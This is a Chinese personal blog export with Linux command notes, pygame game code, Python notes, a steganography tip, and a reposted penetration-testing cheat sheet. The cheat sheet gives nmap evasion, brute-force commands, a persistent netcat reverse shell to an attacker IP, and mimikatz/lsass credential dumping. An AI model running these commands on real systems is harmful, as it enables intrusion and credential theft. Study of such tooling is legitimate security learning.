<p><font size="3" color="red">cd命令</font><br>cd命令用于切换工作路径，格式为“cd [目录名称]”。</p>
<p><font size="3" color="red">ls命令</font><br>ls命令用于显示目录中的文件信息，格式为“ls [选择][文件]”。</p>
<p><font size="3" color="red">pwd命令</font><br>pwd命令用于显示当前目录。</p>
<h3 id="5、文本文件编辑命令"><a href="#5、文本文件编辑命令" class="headerlink" title="5、文本文件编辑命令"></a>5、文本文件编辑命令</h3><p><font size="3" color="red">cat命令</font><br>cat命令用于查看纯文本文件（内容较少），格式为“cat [选项][文件]”。</p>
<p><font size="3" color="red">more命令</font><br>more命令用于查看纯文本文件（内容较多的），格式为“head [选项]文件”。</p>
<p><font size="3" color="red">head命令</font><br>head命令用于查看纯文本文档的前N行，格式为“head [选择][文件]”。</p>
<p><font size="3" color="red">wc命令</font><br>wc命令用于统计指定文本的行数、字数、字节数，格式为“wc [参数] 文本”。</p>
<p><font size="3" color="red">stat命令</font><br>stat命令用于查看文件的具体储存信息和时间等信息，格式为“stat 文件名称”。</p>
<h3 id="6、文件目录管理命令"><a href="#6、文件目录管理命令" class="headerlink" title="6、文件目录管理命令"></a>6、文件目录管理命令</h3><p><font size="3" color="red">touch命令</font><br>touch命令用于创建空白文件或设置文件的时间，格式为“touch [选项][文件]”。<br>touch命令可以和stat命令合用。在渗透测试中改变文件的时间信息等，这里不赘述。</p>
<p><font size="3" color="red">mkdir命令</font><br>mkdir命令用于创建空白的目录，格式为“mkdir [选项] 目录”</p>
<p><font size="3" color="red">cp命令</font><br>cp命令用于复制文件或目录，格式为“cp [选择] 源文件 目标文件”。</p>
<p><font size="3" color="red">mv命令</font><br>mv命令用于移动文件或将文件重命名，格式为“mv [选择] 源文件 [目标路径|目标文件名]”。</p>
<p><font size="3" color="red">file命令</font><br>file命令用于查看文件的类型，格式为“file 文件名”。</p>
<h3 id="7、打包压缩解压与搜索命令"><a href="#7、打包压缩解压与搜索命令" class="headerlink" title="7、打包压缩解压与搜索命令"></a>7、打包压缩解压与搜索命令</h3><p><font size="3" color="red">tar命令</font><br>tar命令用于对文件进行打包压缩或解压，格式为“tar [选项][文件]”<br>tar -czvf 压缩后的文件名 要压缩的文件<br>tar -xzvf 解压文件<br>-c 打包<br>-x 解包<br>-z 打包的同时进行压缩<br>-v 打包时显示详细信息(可选)<br>-f 指定文件名 </p>
<p><font size="3" color="red">find命令</font><br>find文件用于按照指定条件来查找文件，格式为“find [查找路径] 寻找条件 操作”<br>find ./文件名/ -print</p>
<br>
<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>kali学习</category>
        <category>kali基础</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>飞机大战</title>
    <url>/article/1f61e5c8.html</url>
    <content><![CDATA[<p>这几天一直在学习Python，跟着做了一个游戏，飞机大战，以前微信小程序挺火的那个</p>
<p>这里放上源码，图片我就不放了</p>
<a id="more"></a>

<p>plane_main.py</p>
<blockquote>

<div class="hljs code-wrapper"><pre><code>import os
import pygame
from plane_sprites import *

class PlaneGame(object):
    &quot;&quot;&quot;飞机大战主游戏&quot;&quot;&quot;

    def __init__(self):
        print(&quot;游戏初始化...&quot;)

        # 创建游戏窗口
        self.screen = pygame.display.set_mode(SCREEN_RECT.size)

        # 创建游戏时间
        self.clock = pygame.time.Clock()

        # 调用私有方法，精灵和精灵组的创建
        self.__create_sprites()

        # 设置定时器事件 - 创建敌机 1s
        pygame.time.set_timer(CREATE_ENEMY_EVENT, 1000)
        pygame.time.set_timer(HERO_FIRE_EVENT, 500)

    def __create_sprites(self):

        # 创建背景精灵和精灵组
        bg1 = Background()
        bg2 = Background(True)

        self.back_group = pygame.sprite.Group(bg1, bg2)

        # 创建敌机的精灵组
        self.enemy_group = pygame.sprite.Group()

        # 创建英雄地精灵组
        self.hero = Hero()
        self.hero_group = pygame.sprite.Group(self.hero)

    def start_game(self):
        print(&quot;游戏开始了...&quot;)

        while True:
            # 1. 设置刷新帧率
            self.clock.tick(FRAME_PER_SEC)
            # 2. 事件监听
            self.__event_hander()
            # 3. 碰撞检测
            self.__check_collide()
            # 4. 更新/绘制精灵组
            self.__update_sprites()
            # 5. 更新显示
            pygame.display.update()

    def __event_hander(self):
        for event in pygame.event.get():

            # 判断是否退出游戏了
            if event.type == pygame.QUIT:
                PlaneGame.__game_over()
            elif event.type == CREATE_ENEMY_EVENT:
                # 创建敌机精灵
                enemy = Enemy()

                # 将敌机精灵添加到敌机精灵组
                self.enemy_group.add(enemy)
            elif event.type == HERO_FIRE_EVENT:
                self.hero.Fire()
            # elif event.type == pygame.KEYDOWN and event.key == pygame.K_RIGHT:
            #     print(&quot;向右移动...&quot;)

        # 使用键盘提供的方法获取键盘按键 - 按键元组
        keys_pressed = pygame.key.get_pressed()
        # 判断元组中对应得按键索引值 1
        if keys_pressed[pygame.K_RIGHT]:
            self.hero.speed = 2
        elif keys_pressed[pygame.K_LEFT]:
            self.hero.speed = -2
        else:
            self.hero.speed = 0

    def __check_collide(self):
        # 1. 子弹摧毁敌机
        pygame.sprite.groupcollide(
            self.hero.bullets, self.enemy_group, True, True)

        # 2. 敌机撞毁英雄
        enemies = pygame.sprite.spritecollide(
            self.hero, self.enemy_group, True)

        # 判断列表是否有内容
        if len(enemies) &gt; 0:

            # 让英雄牺牲
            self.hero.kill()

            # 结束游戏
            PlaneGame.__game_over()

    def __update_sprites(self):

        self.back_group.update()
        self.back_group.draw(self.screen)

        self.enemy_group.update()
        self.enemy_group.draw(self.screen)

        self.hero_group.update()
        self.hero_group.draw(self.screen)

        self.hero.bullets.update()
        self.hero.bullets.draw(self.screen)

    @staticmethod
    def __game_over():
        print(&quot;游戏结束...&quot;)

        pygame.quit()
        os._exit(1)


if __name__ == &apos;__main__&apos;:

    # 创建游戏对象
    game = PlaneGame()

    # 启动游戏
    game.start_game()</code></pre></div></blockquote>


<p>plane_sprites.py</p>
<blockquote>

<div class="hljs code-wrapper"><pre><code>import random
import pygame

# 屏幕大小的常量
SCREEN_RECT = pygame.Rect(0, 0, 480, 852)
# 刷新的频率
FRAME_PER_SEC = 60
# 创建敌机的定时器常量
CREATE_ENEMY_EVENT = pygame.USEREVENT
# 英雄发射子弹事件
HERO_FIRE_EVENT = pygame.USEREVENT + 1


class GameSprite(pygame.sprite.Sprite):

    def __init__(self, image_name, speed=1):

        # 调用父类的初始化方法
        super().__init__()

        # 定义对象的属性
        self.image = pygame.image.load(image_name)
        self.rect = self.image.get_rect()
        self.speed = speed

    def update(self):

        # 在屏幕的垂直方向上移动
        self.rect.y += self.speed


class Background(GameSprite):
    &quot;&quot;&quot;游戏背景精灵&quot;&quot;&quot;

    def __init__(self, is_alt=False):

        # 1. 调用父类方法实现精灵的创建(feiji/background)
        super().__init__(&quot;./feiji/Background.png&quot;)

        # 2. 判断是否是交替图像，如果是，需要设置初始化图像
        if is_alt:
            self.rect.y = -self.rect.height

    def update(self):

        # 1. 调用父类的方法实现
        super().update()

        # 2. 判断是否移除屏幕，如果移除屏幕， 将图像设置到屏幕的上方
        if self.rect.y &gt;= SCREEN_RECT.height:
            self.rect.y = -self.rect.height


class Enemy(GameSprite):
    &quot;&quot;&quot;敌机精灵&quot;&quot;&quot;

    def __init__(self):
        # 1. 调用父类方法， 创建敌机精灵， 同时指定敌机图片
        super().__init__(&quot;./feiji/enemy0.png&quot;)

        # 2. 指定敌机的初始速度 1~3
        self.speed = random.randint(1, 3)

        # 3. 指定敌机的初始随机位置
        self.rect.bottom = 0

        max_x = SCREEN_RECT.width - self.rect.width
        self.rect.x = random.randint(0, max_x)
        pass

    def update(self):

        # 1. 调用父类方法， 保持垂直方向的飞行
        super().update()

        # 2. 判断是否飞出屏幕， 如果是， 需要从精灵组删除敌机
        if self.rect.y &gt;= SCREEN_RECT.height:
            # kill方法可以将精灵从所有精灵组移出， 精灵就会被自动销毁
            self.kill()

    def __del__(self):
        # print(&quot;敌机挂了 %s &quot; % self.rect)
        pass


class Hero(GameSprite):
    &quot;&quot;&quot;英雄精灵&quot;&quot;&quot;

    def __init__(self):

        # 1. 调用父类方法， 设置imgae&amp;speed
        super().__init__(&quot;./feiji/hero1.png&quot;, 0)

        # 2. 设置英雄的初始位置
        self.rect.centerx = SCREEN_RECT.centerx
        self.rect.bottom = SCREEN_RECT.bottom - 120

        # 3. 创建子弹精灵组
        self.bullets = pygame.sprite.Group()

    def update(self):

        # 英雄在水平方向移动
        self.rect.x += self.speed

        # 控制英雄不能离开屏幕
        if self.rect.x &lt; 0:
            self.rect.x = 0
        elif self.rect.right &gt; SCREEN_RECT.right:
            self.rect.right = SCREEN_RECT.right

    def Fire(self):
        # print(&quot;发射子弹...&quot;)

        for i in (0, 1, 2):
            # 1. 创建子弹精灵
            bullet = Bullet()

            # 2. 设置精灵位置
            bullet.rect.bottom = self.rect.y - i * 20
            bullet.rect.centerx = self.rect.centerx

            # 3. 将精灵添加到精灵组
            self.bullets.add(bullet)


class Bullet(GameSprite):
    &quot;&quot;&quot;子弹精灵&quot;&quot;&quot;

    def __init__(self):
        # 调用父类方法， 设置子弹图片， 设置初始速度
        super().__init__(&quot;./feiji/bullet.png&quot;, -2)

    def update(self):

        # 调用父类方法， 让子弹沿垂直方向飞行
        super().update()

        # 判断子弹是否飞出屏幕
        if self.rect.bottom &lt; 0:
            self.kill()

    def __del__(self):
        # print(&quot;子弹被销毁...&quot;)
        pass</code></pre></div></blockquote>]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>飞机大战中遇到的Python【基础】</title>
    <url>/article/69be526e.html</url>
    <content><![CDATA[<p>最近在学习Python，在编写一款飞机大战的游戏的学习的过程中，遇到的一些知识点，这里记录一下</p>
<a id="more"></a>

<h2 id="如何理解if-–name–-’–main–’"><a href="#如何理解if-–name–-’–main–’" class="headerlink" title="如何理解if –name–==’–main–’"></a>如何理解if –name–==’–main–’</h2><p>一对双下划线可能编译不出来用–代替__</p>
<p>python文件一般有两种使用的方法，<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">第一是作为脚本直接运行&nbsp;</span>，<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">第二是import导入其他脚本中被调用&nbsp;</span>，<br>而if –name–==’–main–’，的作用就是控制这两种情况执行代码的过程，使用这个方法时，是运行在第一种情况下。<br>如果是在当前模块中运行时，–name–==’–main–’;<br>而如果是被import导入到其他模块中时，–name–==’当前模块的名称’。<br>所以，在if –name–==’–main–’主要目的，是为了测试当前模块是否能够达到开发者想要的效果。</p>
</br>

<h2 id="python中super-函数的用法"><a href="#python中super-函数的用法" class="headerlink" title="python中super()函数的用法"></a>python中super()函数的用法</h2><p>super()的主要用法有两种： 在单类继承中，其意义就是不需要父类的名称来调用父类的函数，因此当子类改为继承其他父类的时候，不需要对子类内部的父类调用函数做任何修改就能调用新父类的方法。(这里只说这一种)</p>
<blockquote>

<div class="hljs code-wrapper"><pre><code>class Dog(object):

def bark(self):
    print(&quot;汪汪叫&quot;)


class XiaoGou(Dog):

    def demo(self):
        # 使用 super(). 调用原本在父类中封装的方法
        super().bark()            
        print(&quot;$%^$^&amp;**&quot;)


xiaohuang = XiaoGou()
xiaohei = Dog()

xiaohei.bark()
xiaohuang.demo()</code></pre></div></blockquote>
输出的结果是
<blockquote>

<div class="hljs code-wrapper"><pre><code>汪汪叫
汪汪叫
$%^$^&amp;**</code></pre></div></blockquote>
Dog实例化的对象调用了bark方法，打印输出了 汪汪叫；

<p>XiaoGou实例化的对象调用了自己的demo方法，先调用了父类的方法打印输出了 汪汪叫 ，再打印输出 $%^$^&amp;** 。</p>
</br>
</br>

<h2 id="python中的self"><a href="#python中的self" class="headerlink" title="python中的self"></a>python中的self</h2><p>python规定：访问类成员时，需要在前面加上self。例如：</p>
<blockquote>
    self.name = name
</blockquote>
这里，self.name = name表示为类添加了属性name。
如果变量前不加self，则视为局部变量。这个变量会在方法运行结束后失效。而属性在整个类的范围内都是有效的。
self是只有在类中才会有的。self在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。
<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">在类中函数相互调用要加 self&nbsp;</span>

<p>这篇博客说的很详细，可以去这里看一下👉<a href="https://blog.csdn.net/xrinosvip/article/details/89647884" target="_blank" rel="noopener">读懂python中的self</a></p>
</br>
</br>


<h2 id="pygame中的display模块"><a href="#pygame中的display模块" class="headerlink" title="pygame中的display模块"></a>pygame中的display模块</h2><p>pygame.display 是 Pygame 中用于控制窗口和屏幕显示的模块。<br>这里介绍一些飞机大战中所用到的函数</p>
<p>pygame.display.set_mode()  —  初始化一个准备显示的窗口或屏幕<br>pygame.display.update()  —  更新部分软件界面显示</p>
</br>
</br>
</br>
</br>

</br>
</br>]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>隐写中的文件的分离和分析</title>
    <url>/article/1ae25c13.html</url>
    <content><![CDATA[<p>分离文件</p>
<p>（1）使用dd命令分离(linux/unix下)</p>
<p>我们可以使用dd命令分离出隐藏文件：</p>
<h1 id="dd-if-carter-jpg-of-carter-1-jpg-skip-140147-bs-1"><a href="#dd-if-carter-jpg-of-carter-1-jpg-skip-140147-bs-1" class="headerlink" title="dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1"></a>dd if=carter.jpg of=carter-1.jpg skip=140147 bs=1</h1><p>if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过140147个块后再开始复制，bs设置每次读写块的大小为1字节 。</p>
<p>dd命令：<a href="http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html" target="_blank" rel="noopener">http://www.cnblogs.com/qq78292959/archive/2012/02/23/2364760.html</a></p>
<p>（2）使用foremost工具分离</p>
<p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，直接将文件拆解</p>
<p>分析文件</p>
<p>binwalk 文件</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试工具实战技巧合集[转载]</title>
    <url>/article/f976d484.html</url>
    <content><![CDATA[<p>最近一直在学习一些关于内网渗透的知识，学着学着越来越发现自己会的真是少啊！<br>这里转载一位大佬的一些渗透测试工具的总结，可以说对于我这种还用不明白一些工具的人来说无疑是雪中送炭。<br>这里放上原文地址👉<a href="https://www.freebuf.com/sectool/105524.html" target="_blank" rel="nofollow">渗透测试工具实战技巧合集</a></p>
<a id="more"></a>


<p><span style="color: rgb(0, 176, 80);"><b>本文为作者总结自己在渗透测试中常用的一些小技巧。原文分为两部分，译者将其合二为一，方便大家查阅。</b></span></p>
<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><b><a href="https://image.3001.net/images/20160527/14643414135411.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" src="https://image.3001.net/images/20160527/14643414135411.png!small" alt="hacking.png" width="690" style="display: block;"></a><br></b></span></p>
<noscript><img src="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" alt="hacking.png" height="431" width="690"><br /></b></span></p></noscript>
<h3><span id="-nmap">最好的 NMAP 扫描策略</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 适用所有大小网络最好的 nmap 扫描策略</span>

<p><span class="hljs-comment"># 主机发现，生成存活主机列表</span><br>$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24<br>$ grep <span class="hljs-string">“Status: Up”</span> Discovery.gnmap | cut <span class="hljs-_">-f</span> 2 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> &gt; LiveHosts.txt</p>
<p><span class="hljs-comment"># 端口发现，发现大部分常用端口</span><br><span class="hljs-comment"># <a href="http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf" target="_blank" rel="noopener">http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</a></span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -oG TopTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -oN TopUDP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># 显示 TCP\UDP 端口</span><br>$ grep <span class="hljs-string">“open”</span> FullTCP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘/‘</span> |xargs | sed <span class="hljs-string">‘s/ /,/g’</span>|awk <span class="hljs-string">‘{print “T:”$0}’</span><br>$ grep <span class="hljs-string">“open”</span> FullUDP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘/‘</span> |xargs | sed <span class="hljs-string">‘s/ /,/g’</span>|awk <span class="hljs-string">‘{print “U:”$0}’</span></p>
<p><span class="hljs-comment"># 侦测服务版本</span><br>$ nmap <span class="hljs-_">-s</span>V -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># 扫做系统扫描</span><br>$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># 系统和服务检测</span><br>$ nmap -O <span class="hljs-_">-s</span>V -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt<br></code></pre></div></p>
<h3><span id="nmap">Nmap – 躲避防火墙</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 分段</span>
$ nmap -f

<p><span class="hljs-comment"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</span><br>$ nmap –mtu <span class="hljs-number">24</span></p>
<p><span class="hljs-comment"># 生成随机数量的欺骗</span><br>$ nmap -D <span class="hljs-symbol">RND:</span><span class="hljs-number">10</span> [target]</p>
<p><span class="hljs-comment"># 手动指定欺骗使用的 IP</span><br>$ nmap -D decoy1,decoy2,decoy3 etc.</p>
<p><span class="hljs-comment"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span><br>$ nmap -sI [Zombie IP] [Target IP]</p>
<p><span class="hljs-comment"># 指定源端口号</span><br>$ nmap –source-port <span class="hljs-number">80</span> IP</p>
<p><span class="hljs-comment"># 在每个扫描数据包后追加随机数量的数据</span><br>$ nmap –data-length <span class="hljs-number">25</span> IP</p>
<p><span class="hljs-comment"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</span><br>$ nmap –spoof-mac Dell/Apple/<span class="hljs-number">3</span>Com IP<br></code></pre></div></p>
<h3><span id="nmap-web">Nmap 进行 Web 漏洞扫描</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse target
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap <span class="hljs-_">-s</span>V --script=vuln target
nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=all –script-args vulscancorrelation=1 target
</code></pre></div>
<h3><span id="-dirb">使用 DIRB 爆破目录</span></h3>
<p>注：<a href="http://dirb.sourceforge.net/" target="_blank" rel="noopener">DIRB</a> 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的<a href="https://github.com/lanjelot/patator" target="_blank" rel="noopener">patator</a>，<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>，<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">DirBuster</a>， 国内的御剑等等。</p>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">dirb <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/IP:PORT /usr</span><span class="hljs-regexp">/share/dirb</span><span class="hljs-regexp">/wordlists/common</span>.txt
</code></pre></div>
<h3><span id="patator">Patator – 全能暴力破解测试工具</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span>

<p><span class="hljs-comment"># SMTP 爆破</span><br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> helo=<span class="hljs-string">‘ehlo 192.168.17.128’</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst -x <span class="hljs-symbol">ignore:</span>fgrep=<span class="hljs-string">‘incorrect password or account name’</span><br></code></pre></div></p>
<h3><span id="-fierce-dns">使用 Fierce 爆破 DNS</span></h3>
<p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> 和 <a href="https://github.com/TheRook/subbrute/" target="_blank" rel="noopener">SubBrute</a> 等等</p>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># http://ha.ckers.org/fierce/</span>
$ ./fierce.pl -dns example.com
$ ./fierce.pl –dns example.com –wordlist myWordList.txt
</code></pre></div>
<h3><span id="-nikto-web">使用 Nikto 扫描 Web 服务</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -C all -h http://IP
</code></pre></div>
<h3><span id="-wordpress">扫描 WordPress</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
./wpscan –url http://IP/ –enumerate p
</code></pre></div>
<h3><span id="http">HTTP 指纹识别</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">wget http:<span class="hljs-comment">//www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span>
cd httprint_301<span class="hljs-meta-keyword">/linux/</span>
./httprint -h http:<span class="hljs-comment">//IP -s signatures.txt</span>
</code></pre></div>
<h3><span id="-skipfish">使用 Skipfish 扫描</span></h3>
<p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</p>
<div class="hljs code-wrapper"><pre><code class="hljs dts">skipfish -m <span class="hljs-number">5</span> -LY -S <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/skipfish/</span>dictionaries/complete.wl -o ./skipfish2 -u http:<span class="hljs-comment">//IP</span>
</code></pre></div>
<h3><span id="-nc">使用 NC 扫描</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">nc -v -w 1 target -z 1-1000
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {101..102}; <span class="hljs-keyword">do</span> nc -vv -n -w 1 192.168.56.<span class="hljs-variable">$i</span> 21-25 -z; <span class="hljs-keyword">done</span>
</code></pre></div>
<h3><span id="unicornscan">Unicornscan</span></h3>
<p>注：<a href="http://www.unicornscan.org/" target="_blank" rel="noopener">Unicornscan</a> 是一个信息收集和安全审计的工具。</p>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-msf</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>
<span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-mU</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>

<p><span class="hljs-selector-tag">-H</span> 在生成报告阶段解析主机名<br><span class="hljs-selector-tag">-m</span> 扫描类型 (<span class="hljs-selector-tag">sf</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">tcp</span>, <span class="hljs-selector-tag">U</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">udp</span>)<br><span class="hljs-selector-tag">-Iv</span> <span class="hljs-selector-tag">-</span> 详细<br></code></pre></div></p>
<h3><span id="-xprobe2">使用 Xprobe2 识别操作系统指纹</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">xprobe2</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">tcp</span><span class="hljs-selector-pseudo">:80</span><span class="hljs-selector-pseudo">:open</span> <span class="hljs-selector-tag">IP</span>
</code></pre></div>
<h3><span id="-samba">枚举 Samba</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp">nmblookup -A target
smbclient <span class="hljs-comment">//MOUNT/share -I target -N</span>
rpcclient -U <span class="hljs-string">""</span> target
enum4linux target
</code></pre></div>
<h3><span id="-snmp">枚举 SNMP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp">snmpget -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
snmpwalk -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
snmpbulkwalk -v2c -c <span class="hljs-keyword">public</span> -Cn0 -Cr10 IP
</code></pre></div>
<h3><span id="-windows-cmd">实用的 Windows cmd 命令</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs perl">net localgroup Users
net localgroup Administrators
search dir/<span class="hljs-keyword">s</span> *.doc
<span class="hljs-keyword">system</span>(<span class="hljs-string">"start cmd.exe /k $cmd"</span>)
sc create microsoft_update binpath=<span class="hljs-string">"cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe"</span> start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv <span class="hljs-number">23.92</span>.<span class="hljs-number">17.103</span> <span class="hljs-number">7779</span>
mimikatz.exe <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
Procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp
mimikatz.exe <span class="hljs-string">"sekurlsa::minidump lsass.dmp"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
C:\temp\procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">32</span> 位系统
C:\temp\procdump.exe -accepteula -<span class="hljs-number">64</span> -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">64</span> 位系统
</code></pre></div>
<h3><span id="putty">PuTTY 连接隧道</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css">转发远程端口到目标地址
<span class="hljs-selector-tag">plink</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-P</span> 22 <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">root</span> <span class="hljs-selector-tag">-pw</span> "1234" <span class="hljs-selector-tag">-R</span> 445<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:445</span> <span class="hljs-selector-tag">IP</span>
</code></pre></div>
